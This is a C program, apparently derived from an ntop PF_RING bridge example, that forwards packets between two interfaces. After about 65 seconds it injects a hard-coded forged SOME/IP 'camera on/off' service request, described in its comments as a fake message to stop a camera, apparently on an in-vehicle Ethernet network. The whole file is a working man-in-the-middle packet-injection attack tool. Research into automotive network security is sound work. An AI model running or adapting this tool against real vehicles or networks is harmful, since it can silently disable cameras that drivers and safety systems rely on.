/*
 * (C) 2003-23 - ntop 
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

#define _GNU_SOURCE
#include <signal.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>
#include <poll.h>
#include <sys/time.h>
#include <time.h>
#include <sys/socket.h>

#include "pfring.h"
#include "pfutils.c"

#define MAX_PKT_LEN 1536

u_int32_t num_sent = 0;

double start=0; 
int on_off = 1;

/* ****************************************************** */

void printHelp(void) {
  printf("pfStopCam - Forwards traffic from -a -> -b device using vanilla PF_RING\n\n");
  printf("-h              [Print help]\n");
  printf("-v              [Verbose]\n");
  printf("-p              [Use pfring_send() instead of bridge]\n");
  printf("-a <device>     [First device name]\n");
  printf("-b <device>     [Second device name]\n");
  printf("-g <core_id>    Bind this app to a core\n");
  printf("-w <watermark>  Watermark\n");
}

/* ******************************** */

void my_sigalarm(int sig) {
  char buf[32];

  pfring_format_numbers((double)num_sent, buf, sizeof(buf), 0),
  printf("%s pps\n", buf);
  num_sent = 0;
  alarm(1);
  signal(SIGALRM, my_sigalarm);
}

/* ******************************** */

u_int pktBytes(u_char *pkt, int startIdx, int numBytes) {
  int stopIdx = startIdx + numBytes-1;
  u_int data = pkt[startIdx];
  int i;

  for (i = startIdx; i < stopIdx; ++i)
  {
      data = pkt[i+1] + (data << 8);
  }
  return(data);
}

/* Wait for a delay and attack starts */
int svcAttk(u_char *rcv_pkt, u_int pkt_len) {
  int txAttk=-1;
  float time_stamp;
  struct timespec now;

  clock_gettime(CLOCK_REALTIME, &now);
  time_stamp = (now.tv_sec + (now.tv_nsec/1000000000.0)) - start;
  if (time_stamp>65 && on_off==1) {
    printf("Camera On/Off SOME/IP Service 0x300a Request ==================\n");
    txAttk = 1;
    on_off = 0;
  }

  return(txAttk);
}

/* ****************************************************** */

int main(int argc, char* argv[]) {
  pfring *a_ring, *b_ring, *attk_ring;
  char *a_dev = NULL, *b_dev = NULL, c;
  u_int8_t verbose = 0, use_pfring_send = 0;
  int a_ifindex, b_ifindex, attk_ifindex;
  int bind_core = -1;
  u_int16_t watermark = 1;
  char *bpfFilter = NULL;
  int firstTime=1, bufSize;
  struct timespec startClk;

  /* craft fake message to stop camera */
  u_char fakeOffCamTSRVC_Fcam[] = "\xfc\xd6\xbd\x37\x63\x4a\xbc\x90\x3a\xc3\xd4\xa8\x81\x00\x00\x49\x08\x00\x45\x00\x00\x2f\x50\x34\x00\x00\x01\x11\x9b\x16\xa0\x30\xc7\x06\xa0\x30\xc7\x0c\x7b\x0d\x77\x1a\x00\x1b\x0d\xc7\x30\x0a\x00\x3f\x00\x00\x00\x0b\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00";

  while((c = getopt(argc,argv, "ha:b:c:f:vpg:w:")) != -1) {
    switch(c) {
      case 'h':
        printHelp();
        return 0;
        break;
      case 'a':
        a_dev = strdup(optarg);
        break;
      case 'b':
        b_dev = strdup(optarg);
        break;
      case 'f':
        bpfFilter = strdup(optarg);
        break;
      case 'p':
        use_pfring_send = 1;
        break;
      case 'v':
        verbose = 1;
        break;
      case 'g':
        bind_core = atoi(optarg);
        break;
      case 'w':
        watermark = atoi(optarg);
        break;
    }
  }  

  if ((!a_dev) || (!b_dev)) {
    printf("You must specify two devices!\n");
    return -1;
  }

  if(strcmp(a_dev, b_dev) == 0) {
    printf("Bridge devices must be different!\n");
    return -1;
  }

  /* Device A */
  if((a_ring = pfring_open(a_dev, MAX_PKT_LEN, 
                 PF_RING_PROMISC |
                 PF_RING_LONG_HEADER |
                 PF_RING_DISCARD_INJECTED_PKTS |
                 (use_pfring_send ? 0 : PF_RING_RX_PACKET_BOUNCE))
    ) == NULL) {
    printf("pfring_open error for %s [%s]\n", a_dev, strerror(errno));
    return(-1);
  }

  pfring_set_application_name(a_ring, "pfbridge-a");
  pfring_set_direction(a_ring, rx_only_direction);
  pfring_set_socket_mode(a_ring, recv_only_mode);
  pfring_set_poll_watermark(a_ring, watermark);
  pfring_get_bound_device_ifindex(a_ring, &a_ifindex);

  /* Adding BPF filter */
  if(bpfFilter != NULL) {
    int rc = pfring_set_bpf_filter(a_ring, bpfFilter);
    if(rc != 0)
      printf("pfring_set_bpf_filter(%s) returned %d\n", bpfFilter, rc);
    else
      printf("Successfully set BPF filter '%s'\n", bpfFilter);
  }

  /* Device B */
  if((b_ring = pfring_open(b_dev, MAX_PKT_LEN, 
                 PF_RING_PROMISC | 
                 PF_RING_LONG_HEADER)) == NULL) {
    printf("pfring_open error for %s [%s]\n", b_dev, strerror(errno));
    pfring_close(a_ring);
    return(-1);
  }

  pfring_set_application_name(b_ring, "pfbridge-b");
  pfring_set_socket_mode(b_ring, send_only_mode);
  pfring_get_bound_device_ifindex(b_ring, &b_ifindex);
  
  /* Attack ring */
  if((attk_ring = pfring_open(a_dev, MAX_PKT_LEN, 
                 PF_RING_PROMISC | 
                 PF_RING_LONG_HEADER)) == NULL) {
    printf("pfring_open error for %s [%s]\n", a_dev, strerror(errno));
    pfring_close(a_ring);
    pfring_close(b_ring);
    return(-1);
  }

  pfring_set_application_name(attk_ring, "pfSvcAttk-a");
  pfring_set_socket_mode(attk_ring, send_only_mode);
  pfring_get_bound_device_ifindex(attk_ring, &attk_ifindex);
  
  /* Enable Sockets */

  if (pfring_enable_ring(a_ring) != 0) {
    printf("Unable enabling ring 'a' :-(\n");
    pfring_close(a_ring);
    pfring_close(b_ring);
    return(-1);
  }

  if(use_pfring_send) {
    if (pfring_enable_ring(b_ring)) {
      printf("Unable enabling ring 'b' :-(\n");
      pfring_close(a_ring);
      pfring_close(b_ring);
      pfring_close(attk_ring);
      return(-1);
    }
    if (pfring_enable_ring(attk_ring)) {
      printf("Unable enabling ring 'attk' :-(\n");
      pfring_close(a_ring);
      pfring_close(b_ring);
      pfring_close(attk_ring);
      return(-1);
    }
  } else {
    pfring_close(b_ring);
  }

  signal(SIGALRM, my_sigalarm);
  alarm(1);

  if(bind_core >= 0)
    bind2core(bind_core);
 
  while(1) {
    u_char *buffer;
    struct pfring_pkthdr hdr;
    int attk=-1;
    
    if(pfring_recv(a_ring, &buffer, 0, &hdr, 1) > 0) {
      int rc;
      
      if(use_pfring_send) {

        if (firstTime==1) {
          clock_gettime(CLOCK_REALTIME, &startClk);
          start = startClk.tv_sec + (startClk.tv_nsec/1000000000.0);
          firstTime = 0;
        } 

        /* Wait for a delay and send fake message to stop camera */
        attk = svcAttk((u_char *) buffer, hdr.caplen);
        if (attk==1) {
          bufSize = sizeof(fakeOffCamTSRVC_Fcam);
          rc = pfring_send(attk_ring, (char *) fakeOffCamTSRVC_Fcam, bufSize, 1);
          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", bufSize, pfring_get_mtu_size(attk_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", bufSize);
        }
        else {
          rc = pfring_send(b_ring, (char *) buffer, hdr.caplen, 1);
          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", hdr.caplen, pfring_get_mtu_size(b_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", hdr.len);
        }
      } 
      else {
        rc = pfring_send_last_rx_packet(a_ring, b_ifindex);
        if(rc < 0) printf("pfring_send_last_rx_packet() error %d\n", rc);
        else if(verbose) printf("Forwarded %d bytes packet\n", hdr.len);
      }

      if(rc >= 0) num_sent++;
	
    }
  }

  pfring_close(a_ring);
  if(use_pfring_send) pfring_close(b_ring);
  
  return(0);
}
